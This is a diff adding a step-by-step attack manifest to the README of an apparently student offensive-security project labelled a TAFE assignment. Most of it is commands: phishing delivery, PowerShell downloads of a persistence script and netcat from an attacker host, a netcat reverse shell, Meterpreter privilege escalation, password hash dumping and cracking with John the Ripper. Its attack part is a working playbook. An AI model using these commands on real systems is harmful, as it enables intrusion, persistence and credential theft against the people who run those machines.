@@ -27,6 +27,85 @@ All steps are sub 15 minutes total.
 # CONFIG 
 config here: should be handled by scripts 
 
+# MANIFEST FOR TAFE ASSIGNMENT 
+
+-Run msfstarter.py
+
+-Run an appropriate flask program (Suggested is FLASK_25.py
+
+-Target downloads document from generator from phishing
+
+-All of the scripts require testing and configuration to verify the flask structure for get requests etc 
+
+-In msf console commands: 
+
+```
+powershell -c "Invoke-WebRequest -Uri 'http://10.1.1.1:8080/persistence.bat' -OutFile 'persistence.bat'"
+powershell -c "Invoke-WebRequest -Uri 'http://10.1.1.1:8080/nc.bin' -OutFile 'nc.exe'"
+```
+
+-Start netcat listner in kali 
+
+``` 
+nc -lvp 8339
+```
+
+-Go back to msf console and run following to start netcat shells and persistance 
+
+```
+nc.exe 10.1.1.1 8339 -e
+```
+
+-Metasploit privalage escalation V1: 
+    In msf console try: 
+    
+```
+meterpreter > getsystem
+```
+
+If successful you will have system access, if not:
+Simultaneously perform the following and the manual steps below: 
+
+```
+meterpreter > hashdump 
+meterpreter > hashdump > hashes.txt
+john --format=NT hashes.txt
+```
+In another shell run to crack with wordlist: 
+
+```
+john --format=NT --wordlist= PATH TO WORDLIST HERE/.txt hashes.txt
+```
+A default wordlist for the tafe assignment is provided in the uploads directory. 
+
+MANUALLY PERFORMING TASKS INCASE OF PYTHON AUTOMATION FALIURE. 
+*****Replace <session_id> with the ID of your Meterpreter session.***
+
+```
+meterpreter > sysinfo 
+meterpreter > background 
+msf > use post/multi/recon/local_exploit_suggester
+msf post(local_exploit_suggester) > set SESSION <session_id>
+msf post(local_exploit_suggester) > set SHOWDESCRIPTION true
+msf post(local_exploit_suggester) > run
+```
+
+From the list of suggested exploits, choose an appropriate one based on the target system's architecture and vulnerability. 
+
+Set up and run the chosen exploit:
+
+bash:
+```
+msf > use <exploit_name>
+msf exploit(<exploit_name>) > set SESSION <session_id>
+msf exploit(<exploit_name>) > set payload windows/meterpreter/reverse_tcp
+msf exploit(<exploit_name>) > set LHOST <your_kali_ip>
+msf exploit(<exploit_name>) > set LPORT <your_listener_port>
+msf exploit(<exploit_name>) > exploit
+```
+If the exploit is successful, you should have a new Meterpreter session with administrator privileges. Use the hashdump command to dump the password hashes from the system:
+
+
 ## No warranty: 
 Specific networked infrastructure for automating an attack. 
     Copyright (C) <2023>  <Anthony Grace and his team from Tafe>
